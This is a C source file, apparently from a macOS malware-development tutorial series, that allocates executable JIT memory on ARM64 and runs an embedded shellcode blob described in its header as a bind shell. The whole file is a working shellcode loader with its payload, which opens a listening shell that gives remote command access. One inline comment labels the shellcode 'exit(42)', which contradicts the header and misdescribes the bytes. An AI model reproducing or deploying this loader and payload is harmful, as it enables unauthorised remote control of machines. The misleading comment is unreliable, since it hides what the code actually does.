/*
* hack3.c
* run bind shell
* shellcode via mmap
* author: @cocomelonc
* https://cocomelonc.github.io/macos/2025/09/01/malware-mac-11.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <pthread.h>
#include <unistd.h>

int main() {
  size_t size = 4096;
  void *mem = mmap(NULL, size,
           PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

  if (mem == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  pthread_jit_write_protect_np(0);

  // shellcode: exit(42)
  unsigned char code[] =
  "\x23\x40\x80\xd2\x60\xfc\x48\xd3\x01\xfc\x41\xd3\xe2\x03\x1f\xaa"
  "\x30\x0c\x80\xd2\xe1\xff\x1f\xd4\x13\xfc\x40\xd3\x02\x02\x80\xd2"
  "\x04\x40\x80\xd2\x24\x82\xab\xf2\xe4\x7f\xbf\xa9\xe1\x63\x3f\x8b"
  "\x10\x0d\x80\xd2\xe1\xff\x1f\xd4\xe0\x03\x13\xaa\xe1\x03\x1f\xaa"
  "\x50\x0d\x80\xd2\xe1\xff\x1f\xd4\xe0\x03\x13\xaa\xe1\x03\x1f\xaa"
  "\xe2\x03\x1f\xaa\xd0\x03\x80\xd2\xe1\xff\x1f\xd4\x14\xfc\x40\xd3"
  "\x50\x0b\x80\xd2\x21\x40\x80\xd2\x21\xfc\x48\xd3\xe1\xff\x1f\xd4"
  "\xe0\x03\x14\xaa\x21\x20\x80\xd2\x21\xfc\x48\xd3\xe1\xff\x1f\xd4"
  "\xe0\x03\x14\xaa\x21\xfc\x41\xd3\xe1\xff\x1f\xd4\xe3\x45\x8c\xd2"
  "\x23\xcd\xad\xf2\xe3\x45\xcf\xf2\x63\x0e\xed\xf2\xe3\x7f\xbf\xa9"
  "\xe0\x63\x3f\x8b\xe0\x7f\xbf\xa9\xe1\x63\x3f\x8b\xe2\x03\x1f\xaa"
  "\x70\x07\x80\xd2\xe1\xff\x1f\xd4";

  memcpy(mem, code, sizeof(code));

  pthread_jit_write_protect_np(1);

  ((void(*)())mem)();

  return 0;
}

